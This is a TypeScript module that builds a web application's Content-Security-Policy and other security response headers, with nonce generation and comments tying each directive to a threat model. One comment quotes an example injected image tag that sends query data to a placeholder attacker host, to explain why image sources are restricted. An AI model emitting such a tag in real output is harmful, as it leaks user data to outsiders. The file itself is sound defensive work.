/**
 * Response-header policy (threat model F-14, backstop for F-06).
 *
 * Every directive here is asserted by apps/web-e2e/headers.e2e.ts against a running build,
 * so a header that is lost to a config change fails CI instead of silently disappearing.
 * Change a value here and that test must change with it, deliberately.
 */

export interface CspOptions {
  /** Base64 nonce, fresh per request. */
  nonce: string;
  /**
   * `next dev` needs `eval` for React refresh and source maps. Never true in a production
   * build: the middleware derives it from NODE_ENV, which Next inlines at build time.
   */
  dev: boolean;
}

/**
 * Content-Security-Policy for HTML responses.
 *
 * - `script-src` uses the per-request nonce plus `'strict-dynamic'`: Next.js stamps the nonce
 *   on its own bootstrap scripts, and chunks those scripts load inherit trust. No
 *   `'unsafe-inline'`, no `'unsafe-eval'` outside dev.
 * - `img-src 'self' data:` closes the pixel-exfiltration route from F-06: an injected
 *   `<img src="https://attacker/?q=…">` is blocked by the browser even if the renderer
 *   regresses.
 * - `connect-src 'self'`: the browser only ever talks to our own origin. The Claude API is
 *   called server-side, never from the browser.
 * - `style-src` uses the nonce, not `'unsafe-inline'`. React sets runtime styles through the
 *   CSSOM, which CSP does not govern; server-rendered `style` attributes are blocked, and the
 *   e2e suite fails on any CSP violation so we find out if a component depends on one.
 */
export function contentSecurityPolicy({ nonce, dev }: CspOptions): string {
  const directives: [string, ...string[]][] = [
    ["default-src", "'self'"],
    [
      "script-src",
      "'self'",
      `'nonce-${nonce}'`,
      "'strict-dynamic'",
      ...(dev ? ["'unsafe-eval'"] : []),
    ],
    ["style-src", "'self'", `'nonce-${nonce}'`],
    ["img-src", "'self'", "data:"],
    ["font-src", "'self'"],
    ["connect-src", "'self'"],
    ["media-src", "'none'"],
    ["object-src", "'none'"],
    ["frame-src", "'none'"],
    ["worker-src", "'self'"],
    ["manifest-src", "'self'"],
    ["base-uri", "'none'"],
    ["form-action", "'self'"],
    ["frame-ancestors", "'none'"],
  ];
  if (!dev) directives.push(["upgrade-insecure-requests"]);
  return directives.map((d) => d.join(" ")).join("; ");
}

/**
 * Headers set on every response, HTML or not.
 *
 * HSTS omits `preload` on purpose: preload-list submission is hard to reverse and is tied to
 * the production domain, which is a CEO decision (no public deploy yet).
 */
export const STATIC_SECURITY_HEADERS: Readonly<Record<string, string>> = {
  "Strict-Transport-Security": "max-age=63072000; includeSubDomains",
  "X-Content-Type-Options": "nosniff",
  "Referrer-Policy": "strict-origin-when-cross-origin",
  "Permissions-Policy":
    "camera=(), microphone=(), geolocation=(), payment=(), usb=(), serial=(), bluetooth=(), hid=(), display-capture=(), browsing-topics=()",
  "Cross-Origin-Opener-Policy": "same-origin",
  "Cross-Origin-Resource-Policy": "same-origin",
  // Legacy backstop for browsers that ignore `frame-ancestors`.
  "X-Frame-Options": "DENY",
};

/** 128 bits from the platform CSPRNG, base64-encoded. Works in the Edge and Node runtimes. */
export function generateNonce(): string {
  const bytes = new Uint8Array(16);
  crypto.getRandomValues(bytes);
  let binary = "";
  for (const b of bytes) binary += String.fromCharCode(b);
  return btoa(binary);
}
